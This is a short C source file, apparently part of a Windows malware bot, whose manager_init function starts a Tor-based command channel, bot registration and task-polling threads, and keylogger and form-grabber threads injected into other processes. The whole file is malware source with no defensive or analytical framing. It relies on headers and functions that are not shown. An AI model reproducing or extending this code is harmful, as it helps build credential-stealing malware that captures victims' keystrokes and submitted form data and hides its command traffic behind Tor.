#define WIN32_LEAN_AND_MEAN

#include <windows.h>

#include "global_config.h"
#include "debug.h"

#include "process_injections.h"

#include "manager_init.h"
#include "manager_tor.h"
#include "manager_bot_auto_update_lastseen_thread.h"
#include "manager_bot_auto_get_task_thread.h"
#include "manager_form_grabber_inject_thread.h"
#include "manager_keylogger_inject_thread.h"



bool manager_init(MANAGER_INJECTION_ENTRY_POINT_PARAMS * manager_injection_entry_point_params)
{
	DBG_MSG("manager_init() - BEGIN ... \n");

	bool res = false;

	//
	res = manager_init_winsock_application();

	if (!res) return false;

	//
	res = manager_init_bot_id();

	if (!res) return false;

	//
	res = manager_init_bot_info();

	if (!res) return false;


	//
	res = manager_init_tor_manager_thread(manager_injection_entry_point_params);

	if (!res) return false;

	//
	res = manager_init_bot_auto_update_lastseen_thread();
	if (!res) return false;

	//
	res = manager_init_bot_auto_get_task_thread();
	if (!res) return false;

	//
	res = manager_init_keylogger_inject_thread(manager_injection_entry_point_params);
	if (!res) return false;

	//
	res = manager_init_form_grabber_inject_thread(manager_injection_entry_point_params);
	if (!res) return false;


	//
	return true;
}